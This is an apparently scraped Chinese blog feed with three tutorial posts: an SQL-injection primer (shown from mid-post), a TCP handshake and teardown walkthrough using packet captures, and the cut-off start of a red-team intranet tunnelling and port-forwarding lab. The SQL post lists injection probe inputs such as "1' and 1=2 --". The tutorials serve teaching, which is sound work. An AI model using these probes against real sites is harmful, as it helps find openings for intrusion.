class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = 1</span><br><span class="line">SELECT * FROM users WHERE id=$id LIMIT 0,1</span><br></pre></td></tr></table></figure><p>这俩一样。</p><p>所以SQL注入的第一点原因是：<strong>‘可输入的可变变量’</strong></p><p>然后就是，你得有SQL语句，或者说，你得能够操作数据库，你能从数据库里得到数据</p><p>如果我们下面直接把SQL语句删了，你注入个毛</p><p>所以SQL注入的第二点原因是：<strong>‘可以对数据库操作’</strong></p><p>第三点容易想，如果对方做了防御措施，比如说英文用不了，关键符号用不了，那就根本无法用SQL语句，这就是过滤。</p><p>所以SQL注入的第三点原因是：<strong>‘存在未过滤或者过滤不严谨的语法’</strong></p><h3 id="3-整几道题"><a href="#3-整几道题" class="headerlink" title="3. 整几道题"></a>3. 整几道题</h3><h4 id="1-哪个可能存在注入"><a href="#1-哪个可能存在注入" class="headerlink" title="(1) 哪个可能存在注入"></a>(1) 哪个可能存在注入</h4><p>一下是几个常见的URL地址，哪个编号可能存在注入的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A: www.trtyr.com/index.php?id=1</span><br><span class="line">B: www.trtyr.com/?id=1</span><br><span class="line">C: www.trtyr.com/?id=1&amp;x=1</span><br><span class="line">D: www.trtyr.com/index.php</span><br></pre></td></tr></table></figure><p>如果你是就看了着这篇文章的话，正常来说你应该选择B，因为上面的例子就是和B一样。</p><p>然后如果你看了我文章开头叫你看的那篇文章，你还会选AC，即ABC，其实A和B是一个东西，C就是又加了一个参数</p><p>有过基础的人可能会选D，虽然按照这篇文章讲的，这玩意没有可变变量，但是它可能是POST注入，后面会讲</p><p>所以选ABCD</p><h4 id="2-注入测试正确"><a href="#2-注入测试正确" class="headerlink" title="(2) 注入测试正确"></a>(2) 注入测试正确</h4><p>参数X有注入，以下哪个注入测试是正确的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A: www.trtyr.com/index.php?y=1 and 1=1&amp;x=2</span><br><span class="line">B: www.trtyr.com/index.php?y=1&amp;x=2 and 1=1 </span><br><span class="line">C: www.trtyr.com/index.php?y=1 and 1=1 &amp;x=2 and 1=1 </span><br><span class="line">D: www.trtyr.com/index.php?xx=1 and 1=1 &amp;xxx=2 and 1=1 </span><br></pre></td></tr></table></figure><p>首先，这4个URL都是带有两个参数</p><p>我们看A，A是’y=1 and 1=1&amp;x=2’这是对y进行了注入，题问的是x有注，所以A不对</p><p>再看B，B对了</p><p>然后是C，同时对y和x进行了注入，题也没说y有没有注入，所以这个C对</p><p>最后是D，俩参数，xx和xxx，根本没x，所以不对。</p><h2 id="二-SQL注入分类"><a href="#二-SQL注入分类" class="headerlink" title="二. SQL注入分类"></a>二. SQL注入分类</h2><p>这个是我个人自己分的，仅仅是我自己遇到过的</p><h3 id="1-字符型和数字型注入"><a href="#1-字符型和数字型注入" class="headerlink" title="1. 字符型和数字型注入"></a>1. 字符型和数字型注入</h3><h4 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="(1) 数字型注入"></a>(1) 数字型注入</h4><p>我们看上面的SQL语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=$id LIMIT 0,1</span><br></pre></td></tr></table></figure><p>我们传参的时候，传入的是1，2，3，4这样的数字</p><p>然后SQL传入成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 LIMIT 0,1</span><br></pre></td></tr></table></figure><p>id=1，id等于一个数字，这就是数字型注入</p><h4 id="2-单引号字符型注入"><a href="#2-单引号字符型注入" class="headerlink" title="(2) 单引号字符型注入"></a>(2) 单引号字符型注入</h4><p>什么是单引号字符型注入呢？我们简单写一个SQL语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM movies WHERE movie=&#x27;流浪地球2&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>我们这条语句执行后，会从movies表里找到了movie=’流浪地球2’的数据</p><p>这里 movie=’流浪地球2’ 中，流浪地球2用单引号引起来了，这就是单引号字符型注入</p><h4 id="3-双引号字符型注入"><a href="#3-双引号字符型注入" class="headerlink" title="(3) 双引号字符型注入"></a>(3) 双引号字符型注入</h4><p>和单引号字符型注入的唯一区别就是单引号变双引号</p><p>就像这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM movies WHERE movie=&quot;流浪地球2&quot; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>流浪地球2用双引号引起来了，这就是单引号字符型注入</p><h3 id="2-混合式括号注入"><a href="#2-混合式括号注入" class="headerlink" title="2. 混合式括号注入"></a>2. 混合式括号注入</h3><p>这玩意就是加了括号，这个括号可以加好几个</p><p>举几个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=(1) LIMIT 0,1</span><br><span class="line">SELECT * FROM movies WHERE movie=(&#x27;流浪地球2&#x27;) LIMIT 0,1</span><br><span class="line">SELECT * FROM movies WHERE movie=(&quot;流浪地球2&quot;) LIMIT 0,1</span><br><span class="line">SELECT * FROM users WHERE id=((&quot;1&quot;)) LIMIT 0,1</span><br><span class="line">SELECT * FROM movies WHERE movie=(((&#x27;流浪地球2&#x27;))) LIMIT 0,1</span><br></pre></td></tr></table></figure><ul><li>第一个是单括号加数字型注入</li><li>第二个是单括号加单引号字符型注入</li><li>第三个是单括号加双引号字符型注入</li><li>第四个是双括号加双引号字符型注入</li><li>第五个是三括号加单引号字符型注入</li></ul><p>这个括号可以随便加。</p><h3 id="3-GET和POST型注入"><a href="#3-GET和POST型注入" class="headerlink" title="3. GET和POST型注入"></a>3. GET和POST型注入</h3><h4 id="1-GET型注入"><a href="#1-GET型注入" class="headerlink" title="(1) GET型注入"></a>(1) GET型注入</h4><p>GET型注入，代表的是URL采用的是GET请求方式，就是说参数在URL上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.trtyr.com/index.php?id=1</span><br><span class="line">www.trtyr.com/?id=1</span><br><span class="line">www.trtyr.com/?id=1&amp;x=1</span><br></pre></td></tr></table></figure><p>这样的，id参数在URL上的，就是GET型注入。</p><p>或者看抓包</p><p><img src="\media\post\SQL注入之简要SQL注入\SQL注入之简要SQL注入7.webp" alt=""></p><h4 id="2-POST型注入"><a href="#2-POST型注入" class="headerlink" title="(2) POST型注入"></a>(2) POST型注入</h4><p>简单来说就是请求是POST方式</p><p><img src="\media\post\SQL注入之简要SQL注入\SQL注入之简要SQL注入8.webp" alt=""></p><p>这个通常是在登录界面出现，当然也有可能出现在其他的地方，之后再讲</p><h3 id="4-过滤型注入"><a href="#4-过滤型注入" class="headerlink" title="4. 过滤型注入"></a>4. 过滤型注入</h3><p>他可能会把我们的一些东西给过滤掉，举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=$id LIMIT 0,1</span><br></pre></td></tr></table></figure><p>我们想传参 1 and 1=1</p><p>正常来说就是这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</span><br></pre></td></tr></table></figure><p>那如果它把and给过滤掉了，那么我们传参后，实际的SQL语句是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 1=1 LIMIT 0,1</span><br></pre></td></tr></table></figure><p>and被过滤删除了。</p><p>这只是举了一个例子，还有其他的过滤，以后会讲.</p><h3 id="5-有关回显的注入"><a href="#5-有关回显的注入" class="headerlink" title="5. 有关回显的注入"></a>5. 有关回显的注入</h3><p>有关回显的有三种情况，一种是常规的，就是说参数变了，页面就变了，就是上面说的哪些。</p><p>然后还有两种情况：</p><h4 id="1-回显单一"><a href="#1-回显单一" class="headerlink" title="(1) 回显单一"></a>(1) 回显单一</h4><p>举个例子：</p><p>一个网页的正常数据显示的是1，而且是一个简单的数字型注入</p><p>我们传参<code>1 and 1=1</code>页面显示1</p><p>然后问题出现了，我们传参<code>1 and 1=2</code>页面返回0，传参<code>1&#39; and 1=1</code>页面返回0，传参<code>1&#39;) and 1=1</code>页面返回0</p><p>发现，数据正确返回1，数据不对返回0。这意味着，我们只能通过返回的是1还是0来判断是否注入正确。</p><p>怎么解这种情况之后的文章会讲到</p><h4 id="2-没回显"><a href="#2-没回显" class="headerlink" title="(2) 没回显"></a>(2) 没回显</h4><p>这种情况是压根就没回显，举个例子。</p><p>我们传参 <code>1 and 1=1</code> 后系统告诉我们，内容会通过邮件发给你，然后你等了好几天也没有</p><p>这就意味着，你无法通过页面的数据返回来判断。</p><p>怎么解这种情况之后的文章会讲到</p><h2 id="三-如何判断注入点"><a href="#三-如何判断注入点" class="headerlink" title="三. 如何判断注入点"></a>三. 如何判断注入点</h2><p>我们上面讲’SQL注入的产生原理’的时候，最后说SQL注入的第二点原因是：<strong>‘可以对数据库操作’</strong></p><p>也就意味着，如果我们的注入点找对了，是可以对数据库进行操作，我们就可以通过页面内容来进行判断。</p><p>举几个例子：</p><p>我们传参 <code>1 and 1=1</code> 页面正常，传参 <code>1 and 1=2</code> 页面无显示且不报错, 说明可能是数字型注入</p><p>我们传参 <code>1&#39; and 1=1 --</code> 页面正常，传参 <code>1&#39; and 1=2 --</code> 页面无显示且不报错，说明可能是单引号字符型注入</p><p>这俩是最基础，其他的就是在这个基础上进行更改。</p><p>比如我们传参 <code>1) and 1=1</code>页面正常，传参 <code>1) and 1=2</code> 页面无显示且不报错，说明可能是混合式括号注入</p><p>我们看一下：为啥传参 <code>1&#39; and 1=1 --</code> 页面正常，传参 <code>1&#39; and 1=2 --</code> 页面无显示且不报错，就能说明他是单引号字符型注入？它为啥会无显示且不报错？</p><p>首先出现这些结果就说明了，他对数据库进行操作了。无显示是因为<code>1&#39; and 1=2 --</code>传参后，没数据，所以没显示；没报错是因为语法正确。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP三次握手与四次挥手</title>
      <link href="/2023/02/20/16/"/>
      <url>/2023/02/20/16/</url>
      
        <content type="html"><![CDATA[<h2 id="一-TCP协议简介"><a href="#一-TCP协议简介" class="headerlink" title="一. TCP协议简介"></a>一. TCP协议简介</h2><p>TCP是传输层的协议，传输层的作用是：</p><ul><li>定义应用层数据报文的端口号</li><li>流量控制</li><li>对原始数据进行分段处理</li><li>纠错</li></ul><h3 id="1-传输层"><a href="#1-传输层" class="headerlink" title="1. 传输层"></a>1. 传输层</h3><h4 id="1-传输层所提供的服务"><a href="#1-传输层所提供的服务" class="headerlink" title="(1) 传输层所提供的服务"></a>(1) 传输层所提供的服务</h4><p>传输连接服务</p><p>数据传输服务：浏览控制、差错控制，序列控制</p><h4 id="2-传输层协议"><a href="#2-传输层协议" class="headerlink" title="(2) 传输层协议"></a>(2) 传输层协议</h4><p>面向连接的传输协议 - TCP</p><p>用户数据报协议 - UDP</p><h3 id="2-传输层的TCP协议"><a href="#2-传输层的TCP协议" class="headerlink" title="2. 传输层的TCP协议"></a>2. 传输层的TCP协议</h3><p>TCP要求数据在传输以前必须建立连接（三次握手）；数据传输完成后，必须释放连接（四次挥手），而且它仅支持单播传输：在两个终端之间建立的点对点的连接</p><h2 id="二-TCP数据包"><a href="#二-TCP数据包" class="headerlink" title="二. TCP数据包"></a>二. TCP数据包</h2><p>我们在kali一个http服务，然后用win7去访问它</p><ul><li>kali IP：192.168.40.129</li><li>win7 IP：192.168.40.135</li></ul><p>我们抓个包看看，抓到后我们看TCP的报文</p><h3 id="1-前面的一些报文"><a href="#1-前面的一些报文" class="headerlink" title="1. 前面的一些报文"></a>1. 前面的一些报文</h3><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手1.webp" alt=""></p><p>我们可以看到192.68.40.135和192.168.40.129这两个IP之间搭建了TCP连接</p><p>我们打开一个报文看看</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手2.webp" alt=""></p><p>可以看到，TCP报文里有一个发送的端口号49189，接收方的端口号80.</p><p>往下有一个Sequence Number(raw)，这个是真实的序列，然后有raw和没有raw的其实是一个</p><p>下面有一个 Acknowledgment number（raw），这个是确认的序列号，有raw和没有raw的这里也是一个</p><p>再往下就是Header Length首部长度，这里是32位，标识的是整个TCP的首部长度为32</p><p>然后是就是Flags控制位</p><h3 id="2-Flags控制位"><a href="#2-Flags控制位" class="headerlink" title="2. Flags控制位"></a>2. Flags控制位</h3><p>我们看一下控制位</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手3.webp" alt=""></p><p>最常见的就是URG，ACK，PUSH，RESET，SYN和FIN</p><h4 id="1-URG"><a href="#1-URG" class="headerlink" title="(1) URG"></a>(1) URG</h4><p>URG控制位主要表示是否是紧急发送。</p><p>这里看到是 Not set，就是没有设置</p><h4 id="2-SYN"><a href="#2-SYN" class="headerlink" title="(2) SYN"></a>(2) SYN</h4><p>SYN是建立连接的时候来用的，比如我们上面的那张图。</p><p>SYN那里是标1，代表正在发起请求。</p><h4 id="3-ACK"><a href="#3-ACK" class="headerlink" title="(3) ACK"></a>(3) ACK</h4><p>ACK表示确认的控制位，一般是我们和服务器进行请求，我们请求完后，服务器会有一个确认，所以这个ACK通常是会有set的</p><p>我们这张图是第一次请求，还没请求完呢，所以是 Not set</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手4.webp" alt=""></p><p>这张图就是后面请求完的，这里就有set了，控制位有一个1</p><h4 id="4-PUSH"><a href="#4-PUSH" class="headerlink" title="(4) PUSH"></a>(4) PUSH</h4><p>PUSH定义是否将数据推到上一层</p><p>如果说推到上一层的话，就是应用层，他应该是应用层的协议</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手5.webp" alt=""></p><p>就像这个，他的PUSH设置了，就有了一个HTTP协议。</p><h4 id="5-RESET"><a href="#5-RESET" class="headerlink" title="(5) RESET"></a>(5) RESET</h4><p>RESET代表是否重置连接</p><h4 id="6-FIN"><a href="#6-FIN" class="headerlink" title="(6) FIN"></a>(6) FIN</h4><p>当数据传输完毕后会有一个释放连接，当释放连接的时候这个位置就有了。</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手6.webp" alt=""></p><p>就像这样，这里就是释放了连接</p><h3 id="3-TCP报文字段"><a href="#3-TCP报文字段" class="headerlink" title="3. TCP报文字段"></a>3. TCP报文字段</h3><h4 id="1-简单看图"><a href="#1-简单看图" class="headerlink" title="(1) 简单看图"></a>(1) 简单看图</h4><p>我前面也简单的介绍了一下，我们看下图</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手7.webp" alt=""></p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手8.webp" alt=""></p><h4 id="2-字段理解"><a href="#2-字段理解" class="headerlink" title="(2) 字段理解"></a>(2) 字段理解</h4><p>下面具体介绍以下字段的含义</p><ul><li><p>第一行：源端口和目的端口字段</p><ul><li>TCP源端口（Source Port）：源计算机上的应用程序的端口号，占16 位(bit)。</li><li>TCP目的端口（Destination Port）：目标计算机的应用程序端口号，占16 位(bit)。</li></ul></li><li><p>第二行：序列号字段</p><ul><li>CP序列号（Sequence Number）：占(32bit)它表示本报文段所发送数据的第一个字节的编号。在 TCP 连接中，所传送的字节流的每一个字节都会按顺序编号。</li><li>当SYN标记不为1时，这是当前数据分段第一个字母的序列号；</li><li>如果SYN的值是1时，这个字段的值就是初始序列值（ISN），用于对序列号进行同步。这时，第一个字节的序列号比这个字段的值大1，也就是ISN加1。</li></ul></li><li><p>第三行：确认号字段</p><ul><li>TCP 确认号：（Acknowledgment Number，ACK Number）：占 32 位。它表示接收方期望收到发送方下一个报文段的第一个字节数据的编号。其值是接收计算机即将接收到的下一个序列号，也就是下一个接收到的字节的序列号加1。</li></ul></li><li><p>第四行</p><ul><li>数据偏移字段 <ul><li>TCP 首部长度（Header Length）：数据偏移是指数据段中的“数据”部分起始处距离 TCP 数据段起始处的字节偏移量，占 4 位。其实这里的“数据偏移”也是在确定 TCP 数据段头部分的长度，告诉接收端的应用程序，数据从何处开始。</li></ul></li><li>保留字段<ul><li>保留（Reserved）：占 4 位。为 TCP 将来的发展预留空间，目前必须全部为 0。</li></ul></li><li>标志位字段<ul><li>CWR（Congestion Window Reduce）：拥塞窗口减少标志，用来表明它接收到了设置 ECE 标志的 TCP 包。并且，发送方收到消息之后，通过减小发送窗口的大小来降低发送速率 </li><li>ECE==ECN（ECN Echo）：用来在 TCP三次握手时表明一个 TCP 端是具备 ECN (显式拥塞通告)功能的。在数据传输过程中，它也用来表明接收到的 TCP 包的 IP 头部的 ECN 被设置为 11，即网络线路拥堵。</li><li>URG（Urgent）：表示本报文段中发送的数据是否包含紧急数据。URG=1 时表示有紧急数据。当 URG=1 时，后面的紧急指针字段才有效</li><li>ACK：表示前面的确认号字段是否有效。ACK=1 时表示有效。只有当 ACK=1 时，前面的确认号字段才有效。TCP 规定，连接建立后，ACK 必须为 1 </li><li>PSH（Push）：告诉对方收到该报文段后是否立即把数据推送给上层。如果值为 1，表示应当立即把数据提交给上层，而不是缓存起来</li><li>RST：表示是否重置连接。如果 RST=1，说明 TCP 连接出现了严重错误（如主机崩溃），必须释放连接，然后再重新建立连接。  </li><li>SYN：在建立连接时使用，用来同步序号。<ul><li>当 SYN=1，ACK=0 时，表示这是一个请求建立连接的报文段；  </li><li>当 SYN=1，ACK=1 时，表示对方同意建立连接。</li><li>SYN=1 时，说明这是一个请求建立连接或同意建立连接的报文。只有在前两次握手中 SYN 才为 1。</li></ul></li><li>FIN：标记数据是否发送完毕。如果 FIN=1，表示数据已经发送完成，可以释放连接。</li></ul></li><li>窗口大小字段<ul><li>窗口大小（Window Size）：占 16 位。它表示从 Ack Number 开始还可以接收多少字节的数据量，也表示当前接收端的接收窗口还有多少剩余空间。该字段可以用于 TCP 的流量控制。</li></ul></li></ul></li><li><p>第五行</p><ul><li>TCP校验和字段<ul><li>校验位（TCP Checksum）：占 16 位。它用于确认传输的数据是否有损坏。<br> 发送端基于数据内容校验生成一个数值，接收端根据接收的数据校验生成一个值。两个值必须相同，才能证明数据是有效的。如果两个值不同，则丢掉这个数据包。Checksum 是根据伪头 + TCP 头 + TCP 数据三部分进行计算的。</li></ul></li><li>紧急指针字段<ul><li>紧急指针（Urgent Pointer）：仅当前面的 URG 控制位为 1 时才有意义。它指出本数据段中为紧急数据的字节数，占 16 位。当所有紧急数据处理完后，TCP 就会告诉应用程序恢复到正常操作。即使当前窗口大小为 0，也是可以发送紧急数据的，因为紧急数据无须缓存。</li></ul></li></ul></li><li><p>第六行：可选项字段</p><ul><li>选项（Option）：可以自定义头部字段，长度不定，但长度必须是 32bits 的整数倍</li></ul></li><li><p>第七行：TCP数据</p><ul><li>数据部分(可以不发送任何数据)</li></ul></li></ul><h2 id="三-TCP三次握手"><a href="#三-TCP三次握手" class="headerlink" title="三. TCP三次握手"></a>三. TCP三次握手</h2><p>我们简单画一个图就好理解了。</p><p>这里有一个客户端和服务端，服务端开启了HTTP服务，也就是说服务端有一个网站</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手9.webp" alt=""></p><p>然后客户端访问服务端的网址.</p><p>我们可以想象这个过程是两个人在打招呼聊天</p><h3 id="1-C向S请求连接"><a href="#1-C向S请求连接" class="headerlink" title="1. C向S请求连接"></a>1. C向S请求连接</h3><p><strong>这个过程就是C向S说了一句：’Hi！’</strong></p><p>最开始是向服务端请求连接，请求连接，那根据我们上面说的，SYN会设置为1</p><p>然后在这里会生成一个序号(seq)，我们这里定义它为780071038</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手10.webp" alt=""></p><p>这里对应的实际抓包就是这样的</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手11.webp" alt=""></p><h3 id="2-服务器确认请求"><a href="#2-服务器确认请求" class="headerlink" title="2. 服务器确认请求"></a>2. 服务器确认请求</h3><p><strong>这个过程就是S看向C，问：”你在找我？”</strong></p><p>C发送S一个数据包后，S会进行一个确认，然后会进行一个确认的响应</p><p>这个过程是一个建立请求的过程，所以SYN会有设置，设置为1，同时这是一个S对C的响应，所以还会有一个ACK控制位也设置为1.</p><p>然后acknumber的数值是seq+1.</p><p>同时这个也是请求的过程，意味着这个也会有seq值，不过是一个新的seq值</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手12.webp" alt=""></p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手13.webp" alt=""></p><p>这个还有一个新的seq注意一下，我没用红框标注。</p><h3 id="3-C确认S"><a href="#3-C确认S" class="headerlink" title="3. C确认S"></a>3. C确认S</h3><p><strong>这个过程就是C对S说，问：”对就是找你”</strong></p><p>我们想一想这个过程是请求吗？</p><p>客户机对服务器说一句：”hi”；S问C：”你和我说话吗？”。</p><p>前两个过程，这俩是不是已经就建立好了请求啊，也就是这俩已经有对话了，所以这个就不是请求了，是一个回答，所以只有ACK。</p><p>然后这个ack是过程二的seq的值加1.</p><p>然后这里的seq，由于没有SYN，所以这玩应没有意义</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手14.webp" alt=""></p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手15.webp" alt=""></p><p>我们这里也可以注意以下，这个seq的值是不是第二步的ack值相等。</p><h3 id="4-TCP三次握手总结"><a href="#4-TCP三次握手总结" class="headerlink" title="4. TCP三次握手总结"></a>4. TCP三次握手总结</h3><p>三次握手的目的我们可以看出来，就是为了建立连接。</p><p>过程抽象点就是：</p><p><strong>“Hi！” -&gt; “你在和我说话？” -&gt; “对”</strong></p><ul><li><ol><li><p>Hi的过程是建立请求，发送SYN包，有seq值的设置，我们把这个值用一个变量定义</p><p>seq=x</p></li></ol></li><li><ol><li><p>“你在和我说话？”这个过程也是在建立请求，发送SYN包，有seq值的设置；同时也是一个回答，发送ACK包，有ACK值的设置</p><p>ack=x+1=z<br>new_seq=y</p></li></ol></li><li><ol><li><p>“对”这个过程就不是请求了，就是一个回答，没有SYN了，有ACK</p><p>ack=y+1<br>new_seq=z</p></li></ol></li></ul><h2 id="四-发送数据"><a href="#四-发送数据" class="headerlink" title="四. 发送数据"></a>四. 发送数据</h2><p>当经过三次握手后，C和S之间已经建立了连接。</p><p>这个时候，S就会向C发送他所要的数据。</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手16.webp" alt=""></p><h2 id="五-TCP四次挥手"><a href="#五-TCP四次挥手" class="headerlink" title="五. TCP四次挥手"></a>五. TCP四次挥手</h2><p>当发送数据后，就要断开连接了。这个过程就是四次挥手。</p><p>这个过程可能会出现一些教学事故。</p><h3 id="1-C提示S数据传输完毕"><a href="#1-C提示S数据传输完毕" class="headerlink" title="1. C提示S数据传输完毕"></a>1. C提示S数据传输完毕</h3><p><strong>这个过程就是C对S说：”咱俩可以结束了”</strong></p><p>这个最明显的是结束的标志，所以一定有FIN控制符。</p><p>然后，这里还应该有一个ACK的控制符。</p><p>我们想一下，C向S请求数据，然后S开始发送，然后C告诉S数据传输完毕，这也是一个对请求的回应。</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手17.webp" alt=""></p><p>然后我们看抓包</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手18.webp" alt=""></p><p>这个包就是我们要找的第一个包。</p><p>注意一下这些值：seq=3635267377；ack=36812231042</p><h3 id="2-S回应C"><a href="#2-S回应C" class="headerlink" title="2. S回应C"></a>2. S回应C</h3><p><strong>这个过程就是S对C说：”哦，结束了”</strong></p><p>就是一个ack回应</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手20.webp" alt=""></p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手19.webp" alt=""></p><p>然后注意一下seq和ack的值。</p><p>seq是3681231042，ack是3635267378，ack的值是上一个的seq+1</p><h3 id="3-剩下的"><a href="#3-剩下的" class="headerlink" title="3. 剩下的"></a>3. 剩下的</h3><p>这里没抓到……</p><p>这就是教学事故，因为这个包还受其他的影响</p><h3 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h3><p>其实就是一张图</p><p><img src="\media\post\TCP三次握手与四次挥手\TCP三次握手与四次挥手19.webp" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透介绍学习 - 端口转发</title>
      <link href="/2023/02/16/24/"/>
      <url>/2023/02/16/24/</url>
      
        <content type="html"><![CDATA[<h2 id="一-内网穿透原理"><a href="#一-内网穿透原理" class="headerlink" title="一. 内网穿透原理"></a>一. 内网穿透原理</h2><h3 id="1-内网穿透"><a href="#1-内网穿透" class="headerlink" title="1. 内网穿透"></a>1. 内网穿透</h3><p>利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</p><ul><li>1）端口转发：将发往外网某个端口的数据完全转发给内网，是外网到内网的单向通信。</li><li>2）端口映射：将内网IP的某个端口映射到公网IP的某个端口，实现通过公网IP+端口直接正向访问内网，端口映射实现双向通信</li></ul><h3 id="2-隧道技术"><a href="#2-隧道技术" class="headerlink" title="2. 隧道技术"></a>2. 隧道技术</h3><p>是一种通过使用互联网络的基础设施在网络之间传递数据的方式。</p><p>红队在进攻的时候，需要在复杂的内容中获取稳定的流量交互，以达到目的。</p><p>攻击者通常会采用各种内网穿透技术建立隧道，从不同网络协议层对出口屏蔽或拦截进行绕过。</p><p>进行内网渗透常用的隧道技术有DNS隧道、HTTP隧道、SSH隧道、ICMP隧道等容易被网络防火墙放行的协议。</p><ul><li>1）网络层隧道：IPV6隧道、ICMP隧道、GRE隧道，其中常用的隧道技术是ICMP隧道技术。</li><li>2）传输层隧道：主要有TCP、UDP协议，因此隧道搭建也是基于这两种协议进行的。常用的隧道搭建工具有netcat、 powercat等。</li><li>3）应用层隧道：应用层位于TCP/IP协议的最顶层，通常用于搭建各种应用服务，而基于应用层搭建的隧道技术就是利用各种应用所占用的端口进行搭建，比如有SSH、HTTP/HTTPS和DNS服务，这些服务是服务器经常用到不会被禁止的协议。</li></ul><h3 id="3-各类工具"><a href="#3-各类工具" class="headerlink" title="3. 各类工具"></a>3. 各类工具</h3><p>Windows自带的netsh命令、MSF、CS、 Neo-reGeorg、 proxychains、 profiler、PowerCat、netcat、 Tunna、 frp、 EarthWorm等.</p><h2 id="二-构建实验环境"><a href="#二-构建实验环境" class="headerlink" title="二. 构建实验环境"></a>二. 构建实验环境</h2><h3 id="1-网络构成"><a href="#1-网络构成" class="headerlink" title="1. 网络构成"></a>1. 网络构成</h3><p><img src="\media\2023\02\内网穿透介绍学习1.webp" alt=""></p><ul><li>1）攻击主机：Kali，IP地址：192.168.112.148</li><li>2）代理主机：Windows 2016，IP地址：192.168.112.160、10.10.10.128</li><li>3）内网主机：Windows7，IP地址: 10.10.10.129</li></ul><p>Kali 可以与 Windows 2016 通信，不能与 Windows7 通信；Windows2016 可以与 Windows7 通信。</p><h3 id="2-构建网络"><a href="#2-构建网络" class="headerlink" title="2. 构建网络"></a>2. 构建网络</h3><h4 id="1-代理机-Windows-2016"><a href="#1-代理机-Windows-2016" class="headerlink" title="(1) 代理机 - Windows 2016"></a>(1) 代理机 - Windows 2016</h4><p>关防火墙！关防火墙！关防火墙！</p><p><img src="\media\2023\02\内网穿透介绍学习8.webp" alt=""></p><p>我们需要给这个主机装上两个网卡，默认是一张NAT的，我们需要再添加一张，然后设置为主机模式</p><p><img src="\media\2023\02\内网穿透介绍学习2.webp" alt=""></p><p>然后我们需要去修改网络编辑器的子网IP</p><p><img src="\media\2023\02\内网穿透介绍学习3.webp" alt=""></p><p>设置完后重启，重启后我们看一下网络与共享中心</p><p><img src="\media\2023\02\内网穿透介绍学习4.webp" alt=""></p><p>可以看到有两块网卡。</p><p>我们看看cmd中的显示</p><p><img src="\media\2023\02\内网穿透介绍学习5.webp" alt=""></p><p>可以看到两块网卡上都有配置好的IP地址。</p><h4 id="2-目标主机-Win7"><a href="#2-目标主机-Win7" class="headerlink" title="(2) 目标主机 - Win7"></a>(2) 目标主机 - Win7</h4><p>这个防火墙也要关了</p><p>win7和2016需要能够互联互通的。它就不用加网卡的，只需要改一处就可以了</p><p><img src="\media\2023\02\内网穿透介绍学习6.webp" alt=""></p><p>我们看一下IP</p><p><img src="\media\2023\02\内网穿透介绍学习7.webp" alt=""></p><p>可以看到和2016的第二张网卡在一个网段。</p><p>我们ping一下</p><p><img 